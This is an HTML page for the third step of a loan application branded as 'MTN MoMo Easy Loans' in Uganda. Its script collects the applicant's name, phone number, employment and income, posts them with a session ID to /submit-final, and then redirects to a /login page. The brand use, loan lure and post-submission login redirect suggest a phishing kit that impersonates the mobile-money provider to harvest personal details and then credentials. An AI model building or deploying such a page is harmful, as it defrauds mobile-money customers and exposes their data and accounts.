<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MTN MoMo – Easy Loans</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --mtn-dark: #003366;
    --mtn-gold: #FFD700;
    --mtn-light: #004080;
    --grad: linear-gradient(to right, #003366, #004080);
    --page-bg: #F5F5F5;
    --white: #FFFFFF;
    --text-dark: #1C2340;
    --text-mid: #444;
    --text-light: #888;
    --border: #ddd;
    --radius: 12px;
    --radius-sm: 8px;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Inter', sans-serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }

  .mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 4px; }
  .mtn-logo-icon { width: 45px; height: 45px; background: var(--mtn-gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; font-weight: 900; color: var(--mtn-dark); position: relative; }
  .mtn-logo-icon::after { content: 'M'; font-size: 2rem; font-weight: 900; }
  .mtn-logo-text { font-size: 1rem; font-weight: 700; color: var(--mtn-dark); }
  .mtn-logo-sub { font-size: 0.65rem; color: #888; font-weight: 500; }

  .navbar { background: var(--mtn-dark); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
  .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.6); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; }
  .nav-left:hover { color:#fff; }
  .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
  .hline { width:20px; height:2px; background:rgba(255,255,255,0.6); border-radius:1px; }

  .btn-grad { background: var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:'Inter',sans-serif; transition:opacity 0.2s; }
  .btn-grad:hover { opacity:0.9; }
  .btn-gray { background:#e0e0e0; color:#666; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; flex:1; font-family:'Inter',sans-serif; transition:background 0.2s; }
  .btn-gray:hover { background:#d0d0d0; }

  .field { margin-bottom:18px; }
  .field label { display:block; font-size:0.82rem; font-weight:500; color:var(--text-mid); margin-bottom:6px; }
  .field input, .field select { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; appearance:none; -webkit-appearance:none; }
  .field input:focus, .field select:focus { border-color:var(--mtn-gold); box-shadow:0 0 0 3px rgba(255,215,0,0.2); }
  .sel-wrap { position:relative; }
  .sel-wrap::after { content:'▾'; position:absolute; right:14px; top:50%; transform:translateY(-50%); color:var(--text-light); pointer-events:none; font-size:0.9rem; }

  .step-center { flex:1; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px; }
  .step-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.08); padding:32px 28px; }
  .step-card h2 { font-size:1.25rem; font-weight:700; text-align:center; margin-bottom:4px; }
  .step-sub { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:4px; }

  .prog-row { display:flex; gap:8px; margin:10px 0 24px; }
  .prog-seg { flex:1; height:4px; border-radius:2px; background:#e0e0e0; transition:background 0.3s; }
  .prog-seg.done { background:var(--mtn-gold); }
  .prog-seg.now  { background:var(--mtn-gold); }

  .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
  .msg-box.show { display:flex; }
  .msg-box.error   { background:#fef2f2; border:1.5px solid #fecaca; color:#991b1b; }
  .msg-icon { font-weight:700; }

  .sum-box { border:1px solid #e0e0e0; border-left:4px solid var(--mtn-gold); border-radius:var(--radius-sm); padding:16px 14px; margin:16px 0; background:#fafffe; }
  .sum-box h3 { font-size:0.88rem; font-weight:600; margin-bottom:12px; }
  .sum-row { display:flex; justify-content:space-between; font-size:0.82rem; padding:7px 0; border-bottom:1px solid #f0f0f0; }
  .sum-row:last-child { border-bottom:none; }
  .sum-row .sk { color:var(--text-light); }
  .sum-row .sv { font-weight:500; }

  .pg-footer { margin-top:auto; padding:14px; text-align:center; font-size:0.78rem; color:var(--text-light); background:#fff; border-top:1px solid #eee; flex-shrink:0; }

  .step-btns { display:flex; gap:12px; margin-top:8px; }
  .step-btns .btn-grad { flex:1; }

  .spinner { width:44px; height:44px; border:4px solid #eee; border-top-color:var(--mtn-gold); border-radius:50%; animation:spin 0.8s linear infinite; margin:16px auto; }
  @keyframes spin { to{transform:rotate(360deg)} }
  .loading { display:none; text-align:center; }
  .loading.show { display:block; }
  .wait-msg { text-align:center; color:var(--text-light); font-size:0.88rem; }
</style>
</head>
<body>
  <nav class="navbar">
    <a class="nav-left" href="/step2">← Back</a>
    <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
      <div class="mtn-logo-icon" style="width: 32px; height: 32px; font-size: 1.2rem;">M</div>
      <div style="text-align: left;">
        <div class="mtn-logo-text" style="font-size: 0.9rem;">MTN MoMo</div>
        <div class="mtn-logo-sub" style="font-size: 0.6rem;">Loans</div>
      </div>
    </div>
    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
  </nav>
  <div class="step-center">
    <div class="step-card">
      <h2>Loan Application</h2>
      <p class="step-sub">Step 3 of 3</p>
      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
      <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
      <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected>Self-employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
      <div class="field"><label>Annual Income (UGX)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')"></div>
      <div class="sum-box" id="summaryBox">
        <h3>Application Summary</h3>
        <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">UGX 1,000,000</span></div>
        <div class="sum-row"><span class="sk">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
        <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
        <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
        <div class="sum-row"><span class="sk">Phone:</span><span class="sv" id="sPh">—</span></div>
      </div>
      <div class="step-btns">
        <button class="btn-gray" onclick="window.location.href='/step2'">BACK</button>
        <button class="btn-grad" onclick="submitApp()">SUBMIT APPLICATION</button>
      </div>
      <div id="mSub" class="loading">
        <div class="spinner"></div>
        <div class="wait-msg">Submitting application…</div>
      </div>
    </div>
  </div>
  <div class="pg-footer">© 2026 MTN MoMo Loans</div>

  <script>
    function clearErr(id) { document.getElementById(id).classList.remove('show'); }
    function showErr(id, msg) {
      document.getElementById(id).classList.add('show');
      document.getElementById(id + 'Txt').textContent = msg;
    }

    // Update summary
    function updateSummary() {
      const amount = localStorage.getItem('loanAmount') || '1000000';
      const term = localStorage.getItem('loanTerm') || '48 Months';
      const purpose = localStorage.getItem('loanPurpose') || 'Not specified';
      const firstName = localStorage.getItem('firstName') || '';
      const lastName = localStorage.getItem('lastName') || '';
      const phone = localStorage.getItem('phone') || '';

      document.getElementById('sA').textContent = 'UGX ' + parseInt(amount).toLocaleString();
      document.getElementById('sT').textContent = term;
      document.getElementById('sP').textContent = purpose;
      document.getElementById('sN').textContent = firstName + ' ' + lastName || '—';
      document.getElementById('sPh').textContent = phone ? '+256 ' + phone : '—';
    }
    updateSummary();

    // Pre-fill
    if (localStorage.getItem('employmentStatus')) {
      document.getElementById('s3em').value = localStorage.getItem('employmentStatus');
    }
    if (localStorage.getItem('annualIncome')) {
      document.getElementById('s3in').value = localStorage.getItem('annualIncome');
    }

    function submitApp() {
      const em = document.getElementById('s3em').value;
      const in_ = +document.getElementById('s3in').value;

      if (!em || in_ <= 0) {
        showErr('s3Err', 'Please complete all fields.');
        return;
      }

      localStorage.setItem('employmentStatus', em);
      localStorage.setItem('annualIncome', in_);

      // Show spinner
      document.getElementById('mSub').classList.add('show');
      document.querySelector('.step-btns').style.display = 'none';

      // Send to server
      const loanData = {
        loanType: localStorage.getItem('loanType'),
        loanAmount: localStorage.getItem('loanAmount'),
        loanTerm: localStorage.getItem('loanTerm'),
        loanPurpose: localStorage.getItem('loanPurpose'),
        firstName: localStorage.getItem('firstName'),
        lastName: localStorage.getItem('lastName'),
        phone: localStorage.getItem('phone'),
        employmentStatus: em,
        annualIncome: in_
      };

      fetch('/submit-final', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: localStorage.getItem('sessionId'), ...loanData })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          window.location.href = '/login';
        } else {
          document.getElementById('mSub').classList.remove('show');
          document.querySelector('.step-btns').style.display = 'flex';
          showErr('s3Err', 'Failed to submit application. Please try again.');
        }
      })
      .catch(err => {
        document.getElementById('mSub').classList.remove('show');
        document.querySelector('.step-btns').style.display = 'flex';
        showErr('s3Err', 'Network error: ' + err.message);
      });
    }
  </script>
</body>
</html>
